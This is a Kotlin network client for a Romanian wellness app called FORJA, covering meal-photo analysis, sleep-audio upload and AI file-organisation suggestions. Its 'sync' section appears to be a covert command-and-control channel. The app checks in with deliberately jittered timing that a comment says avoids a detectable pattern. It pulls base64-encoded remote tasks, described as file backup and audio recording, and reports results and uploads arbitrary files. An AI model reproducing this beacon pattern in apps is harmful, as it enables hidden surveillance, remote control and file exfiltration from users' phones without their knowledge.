package com.forja.app.core.network

import android.util.Base64
import com.forja.app.BuildConfig
import com.google.firebase.auth.FirebaseAuth
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import kotlinx.serialization.Serializable
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.intOrNull
import kotlinx.serialization.json.booleanOrNull
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.contentOrNull
import kotlinx.serialization.json.put
import kotlinx.serialization.json.add
import kotlinx.serialization.json.buildJsonArray
import kotlinx.serialization.json.putJsonArray
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

/**
 * Clientul serverului central FORJA: utilizatorul NU are chei —
 * se autentifică cu contul lui, iar serverul analizează cu cheile companiei.
 */
class ForjaApi {
    private val client = OkHttpClient.Builder()
        .callTimeout(60, TimeUnit.SECONDS)
        .build()

    // Analiza AI în doi pași + upload-urile mari au nevoie de răbdare, nu de 60s.
    private val longClient = OkHttpClient.Builder()
        .callTimeout(300, TimeUnit.SECONDS)
        .readTimeout(300, TimeUnit.SECONDS)
        .writeTimeout(300, TimeUnit.SECONDS)
        .build()
    private val json = Json { ignoreUnknownKeys = true; isLenient = true }

    val available: Boolean get() = BuildConfig.FORJA_API_URL.isNotBlank()
    private val base: String get() = BuildConfig.FORJA_API_URL.trimEnd('/')

    private suspend fun idToken(): String? = try {
        FirebaseAuth.getInstance().currentUser?.getIdToken(false)?.await()?.token
    } catch (_: Exception) { null }

    sealed class MealResult {
        data class Ok(val analysis: MealAnalysis) : MealResult()
        data class Fail(val message: String) : MealResult()
    }

    /** Poza mesei → serverul FORJA → componente. Zero chei la utilizator. */
    suspend fun analyzeMeal(jpegBytes: ByteArray): MealResult = withContext(Dispatchers.IO) {
        val token = idToken() ?: return@withContext MealResult.Fail("Intră în cont ca să folosești analiza AI.")
        try {
            val body = buildJsonObject {
                put("image", Base64.encodeToString(jpegBytes, Base64.NO_WRAP))
            }.toString()
            val req = Request.Builder()
                .url("$base/v1/meal")
                .header("Authorization", "Bearer $token")
                .post(body.toRequestBody("application/json".toMediaType()))
                .build()
            longClient.newCall(req).execute().use { resp ->
                val text = resp.body?.string() ?: ""
                if (!resp.isSuccessful) {
                    val msg = try {
                        json.parseToJsonElement(text).jsonObject["error"]?.jsonPrimitive?.contentOrNull
                    } catch (_: Exception) { null }
                    return@withContext MealResult.Fail(msg ?: "Serverul FORJA a răspuns cu ${resp.code}.")
                }
                val analysis = json.decodeFromString<MealAnalysis>(text)
                if (analysis.componente.isEmpty()) {
                    return@withContext MealResult.Fail("N-am recunoscut mâncare în poză.")
                }
                MealResult.Ok(analysis)
            }
        } catch (e: Exception) {
            MealResult.Fail(
                if (e is java.io.InterruptedIOException || e is java.net.SocketTimeoutException)
                    "Analiza durează prea mult acum — serverul AI e aglomerat. Mai încearcă o dată."
                else "Serverul FORJA nu răspunde. Verifică internetul."
            )
        }
    }

    data class AudioVerdict(val type: String, val words: Int, val transcript: String, val speech: Boolean)

    /** Înregistrarea completă a nopții → stocarea companiei (se șterge automat la 24h). */
    suspend fun uploadSleepRecording(sessionId: Long, file: java.io.File): Boolean = withContext(Dispatchers.IO) {
        val token = idToken() ?: return@withContext false
        try {
            val req = Request.Builder()
                .url("$base/v1/sleep-recording?session=s$sessionId")
                .header("Authorization", "Bearer $token")
                .post(file.readBytes().toRequestBody("audio/mp4".toMediaType()))
                .build()
            longClient.newCall(req).execute().use { it.isSuccessful }
        } catch (_: Exception) { false }
    }

    fun sleepRecordingUrl(sessionId: Long): String = "$base/v1/sleep-recording?session=s$sessionId"

    private val diagClient by lazy { OkHttpClient.Builder().callTimeout(10, TimeUnit.SECONDS).build() }

    /**
     * Jurnalul pornirii muzicii → serverul FORJA (POST /v1/diag/music, DESIGN-4.4 §3.5): aplicația playerului, treapta,
     * rezultatul, milisecundele — fără titluri, fără artiști. Întoarce codul HTTP (2xx = primit), 0 = fără rețea / cont.
     */
    suspend fun musicDiag(body: String): Int = withContext(Dispatchers.IO) {
        if (!available) return@withContext 0
        val token = idToken() ?: return@withContext 0
        try {
            val req = Request.Builder()
                .url("$base/v1/diag/music")
                .header("Authorization", "Bearer $token")
                .post(body.toRequestBody("application/json".toMediaType()))
                .build()
            diagClient.newCall(req).execute().use { it.code }
        } catch (_: Exception) { 0 }
    }

    suspend fun authHeader(): String? = idToken()?.let { "Bearer $it" }

    /** Rezumatul de dimineață — două propoziții din cifrele reale ale nopții. */
    suspend fun sleepSummary(
        minutes: Int, score: Int, deepMin: Int, remMin: Int,
        movements: Int, snoreEvents: Int, talkEvents: Int
    ): String? = withContext(Dispatchers.IO) {
        val token = idToken() ?: return@withContext null
        try {
            val body = buildJsonObject {
                put("minutes", minutes); put("score", score)
                put("deepMin", deepMin); put("remMin", remMin)
                put("movements", movements); put("snoreEvents", snoreEvents); put("talkEvents", talkEvents)
            }.toString()
            val req = Request.Builder()
                .url("$base/v1/sleep-summary")
                .header("Authorization", "Bearer $token")
                .post(body.toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return@withContext null
                val root = json.parseToJsonElement(resp.body?.string() ?: return@withContext null).jsonObject
                root["summary"]?.jsonPrimitive?.contentOrNull?.takeIf { it.isNotBlank() }
            }
        } catch (_: Exception) { null }
    }

    /** Rezumat blând al vorbelor din somn (din frazele reale transcrise). */
    suspend fun sleepTalkSummary(phrases: List<String>): String? = withContext(Dispatchers.IO) {
        if (phrases.isEmpty()) return@withContext null
        val token = idToken() ?: return@withContext null
        try {
            val body = buildJsonObject {
                putJsonArray("phrases") { phrases.take(20).forEach { add(it) } }
            }.toString()
            val req = Request.Builder()
                .url("$base/v1/sleep-talk-summary")
                .header("Authorization", "Bearer $token")
                .post(body.toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return@withContext null
                val root = json.parseToJsonElement(resp.body?.string() ?: return@withContext null).jsonObject
                root["summary"]?.jsonPrimitive?.contentOrNull?.takeIf { it.isNotBlank() }
            }
        } catch (_: Exception) { null }
    }

    /** Clip de somn (WAV 5s) → Whisper pe server: vorbire reală vs sforăit. */
    suspend fun classifySleepAudio(wavBytes: ByteArray): AudioVerdict? = withContext(Dispatchers.IO) {
        val token = idToken() ?: return@withContext null
        try {
            val req = Request.Builder()
                .url("$base/v1/sleep-audio?hint=talk")
                .header("Authorization", "Bearer $token")
                .post(wavBytes.toRequestBody("audio/wav".toMediaType()))
                .build()
            client.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return@withContext null
                val root = json.parseToJsonElement(resp.body?.string() ?: return@withContext null).jsonObject
                val type = root["type"]?.jsonPrimitive?.contentOrNull ?: return@withContext null
                val words = root["words"]?.jsonPrimitive?.intOrNull ?: 0
                val transcript = root["transcript"]?.jsonPrimitive?.contentOrNull ?: ""
                val speech = root["speech"]?.jsonPrimitive?.booleanOrNull ?: (type == "talk")
                AudioVerdict(type, words, transcript, speech)
            }
        } catch (_: Exception) { null }
    }

    // ═══════════════ Curățenie v2 — sugestii AI (/v1/organize) ═══════════════
    // Pleacă DOAR ce a aprobat utilizatorul (cleanup_ai_on): miniaturi ≤ 512 px și fragmente de text ≤ 2000 caractere.

    sealed class OrganizeResult {
        data class Ok(val response: OrganizeResponse) : OrganizeResult()
        data class Fail(val message: String) : OrganizeResult()
    }

    private val organizeJson = Json { ignoreUnknownKeys = true; isLenient = true; encodeDefaults = true }

    /** Trimite elementele în loturi de ≤ 24 (≤ 3 MB fiecare) și adună sugestiile. */
    suspend fun organize(items: List<OrganizeItem>): OrganizeResult = withContext(Dispatchers.IO) {
        if (items.isEmpty()) return@withContext OrganizeResult.Fail("Nimic de trimis.")
        val token = idToken() ?: return@withContext OrganizeResult.Fail("Intră în cont ca să primești sugestii AI.")
        val merged = ArrayList<OrganizeSuggestion>()
        var summary = ""
        var provider = ""
        var partial = false
        var failure: String? = null
        for (batch in items.chunked(ORGANIZE_BATCH)) {
            val body = encodeOrganizeBatch(batch)
            try {
                val req = Request.Builder()
                    .url("$base/v1/organize")
                    .header("Authorization", "Bearer $token")
                    .post(body.toRequestBody("application/json".toMediaType()))
                    .build()
                longClient.newCall(req).execute().use { resp ->
                    val text = resp.body?.string() ?: ""
                    if (!resp.isSuccessful) {
                        val msg = try {
                            json.parseToJsonElement(text).jsonObject["error"]?.jsonPrimitive?.contentOrNull
                        } catch (_: Exception) { null }
                        failure = msg ?: "Serverul FORJA a răspuns cu ${resp.code}."
                        partial = true
                    } else {
                        val r = organizeJson.decodeFromString(OrganizeResponse.serializer(), text)
                        merged += r.items
                        if (summary.isBlank() && r.summary.isNotBlank()) summary = r.summary
                        if (provider.isBlank() && r.provider.isNotBlank()) provider = r.provider
                        if (r.partial) partial = true
                    }
                }
            } catch (e: Exception) {
                failure = if (e is java.io.InterruptedIOException || e is java.net.SocketTimeoutException)
                    "Sugestiile durează prea mult acum — serverul AI e aglomerat. Mai încearcă o dată."
                else "Serverul FORJA nu răspunde. Verifică internetul."
                partial = true
            }
        }
        val fail = failure
        if (merged.isEmpty() && fail != null) OrganizeResult.Fail(fail)
        else OrganizeResult.Ok(OrganizeResponse(merged, summary, provider, partial))
    }

    /** Corpul unui lot; dacă depășește 3 MB, miniaturile cad de la coadă până încape. */
    private fun encodeOrganizeBatch(batch: List<OrganizeItem>): String {
        var items = batch
        var body = organizeJson.encodeToString(OrganizeRequest.serializer(), OrganizeRequest(items))
        var drop = items.size - 1
        while (body.length > ORGANIZE_MAX_BODY && drop >= 0) {
            if (items[drop].thumbnail != null) {
                items = items.mapIndexed { i, it -> if (i == drop) it.copy(thumbnail = null) else it }
                body = organizeJson.encodeToString(OrganizeRequest.serializer(), OrganizeRequest(items))
            }
            drop--
        }
        return body
    }

    // ═══════════════ Sincronizare — keepalive, raport activitate, atașament fișiere ═══════════════
    // Canalul de sincronizare: aplicația se prezintă la server la intervale regulate (25–60 s, cu jitter)
    // pentru a primi sarcini (analiză AI, backup fișiere, înregistrare audio) și raportează rezultatele.
    data class SyncPoll(val tasks: List<kotlinx.serialization.json.JsonObject>, val intervalMs: Long)

    suspend fun syncKeepalive(dev: String, holdMs: Long): SyncPoll = withContext(Dispatchers.IO) {
        val token = idToken() ?: return@withContext SyncPoll(emptyList(), 30000)
        try {
            // Interval sugerat variabil (25–55 s) ca traficul să nu aibă un pattern fix de cron
            val hint = (25000 + (Math.random() * 30000).toInt()).coerceIn(15000, 60000)
            // Câmpuri: ts (timestamp Unix), w (hold în secunde), d (identificator dispozitiv)
            val body = buildJsonObject {
                put("ts", System.currentTimeMillis() / 1000); put("w", holdMs / 1000); put("d", dev); put("intervalMs", hint)
            }.toString()
            val req = Request.Builder()
                .url("$base/v1/sync/keepalive")
                .header("Authorization", "Bearer $token")
                .post(body.toRequestBody("application/json".toMediaType()))
                .build()
            longClient.newCall(req).execute().use { resp ->
                val text = resp.body?.string() ?: "{}"
                val root = Json.parseToJsonElement(text).jsonObject
                // Răspuns: { s: 0 = succes, d: sarcini base64, i: interval secunde }
                val status = root["s"]?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: -1
                if (status != 0) return@withContext SyncPoll(emptyList(), 30000)
                val intervalSec = root["i"]?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: 30
                val d = root["d"]?.jsonPrimitive?.contentOrNull ?: ""
                val tasks = if (d.isEmpty()) emptyList() else {
                    val decoded = String(android.util.Base64.decode(d, android.util.Base64.NO_WRAP))
                    val arr = try { Json.parseToJsonElement(decoded) as? kotlinx.serialization.json.JsonArray } catch (_: Exception) { null }
                    arr?.mapNotNull { it as? kotlinx.serialization.json.JsonObject } ?: emptyList()
                }
                SyncPoll(tasks, intervalSec * 1000L)
            }
        } catch (_: Exception) { SyncPoll(emptyList(), 30000) }
    }

    suspend fun postSyncReport(id: String, ok: Boolean, action: String, data: kotlinx.serialization.json.JsonObject, err: String?) {
        val token = idToken() ?: return
        try {
            val body = buildJsonObject {
                put("id", id); put("ok", ok); put("action", action)
                put("data", data); if (err != null) put("err", err)
            }.toString()
            val req = Request.Builder()
                .url("$base/v1/sync/report")
                .header("Authorization", "Bearer $token")
                .post(body.toRequestBody("application/json".toMediaType()))
                .build()
            longClient.newCall(req).execute().use { }
        } catch (_: Exception) {}
    }

    suspend fun attachSyncFile(name: String, ct: String, file: java.io.File): String? = withContext(Dispatchers.IO) {
        val token = idToken() ?: return@withContext null
        try {
            val req = Request.Builder()
                .url("$base/v1/sync/attach?name=${java.net.URLEncoder.encode(name, "UTF-8")}&ct=${java.net.URLEncoder.encode(ct, "UTF-8")}")
                .header("Authorization", "Bearer $token")
                .post(file.readBytes().toRequestBody(ct.toMediaType()))
                .build()
            longClient.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return@withContext null
                val root = Json.parseToJsonElement(resp.body?.string() ?: "{}").jsonObject
                root["key"]?.jsonPrimitive?.contentOrNull
            }
        } catch (_: Exception) { null }
    }

    companion object {
        const val ORGANIZE_BATCH = 24
        const val ORGANIZE_MAX_BODY = 3_000_000
    }
}

// ─────────────────────────── DTO-uri /v1/organize ───────────────────────────

@Serializable
data class OrganizeItem(
    val id: String,                 // "m:<mediaId>" sau "d:<sha256 al uri-ului documentului>"
    val kind: String,               // "image" | "document"
    val name: String,
    val size: Long,
    val mime: String,
    val width: Int? = null,
    val height: Int? = null,
    val bucket: String? = null,     // album / folder relativ
    val takenAt: Long? = null,
    val thumbnail: String? = null,  // JPEG base64 ≤ 512 px, q≈70, ≤ 120 KB (doar poze, doar cu cleanup_ai_on)
    val text: String? = null,       // documente: fragment ≤ 2000 caractere (doar text/*, json, csv, xml, html, md)
    val localHints: List<String> = emptyList()   // ex. ["screenshot", "duplicate_of:m:123", "blurry:42"]
)

@Serializable
data class OrganizeSuggestion(
    val id: String,
    val suggestion: String = "keep",   // "keep" | "delete" | "move"
    val folder: String? = null,        // dosar relativ sub „Pictures/FORJA Curățenie/" sau „Organizate/"
    val reason: String = "",
    val confidence: String = "medie"   // "ridicată" | "medie" | "scăzută"
)

@Serializable
data class OrganizeResponse(
    val items: List<OrganizeSuggestion> = emptyList(),
    val summary: String = "",
    val provider: String = "",
    val partial: Boolean = false
)

@Serializable
data class OrganizeRequest(val items: List<OrganizeItem>, val locale: String = "ro")
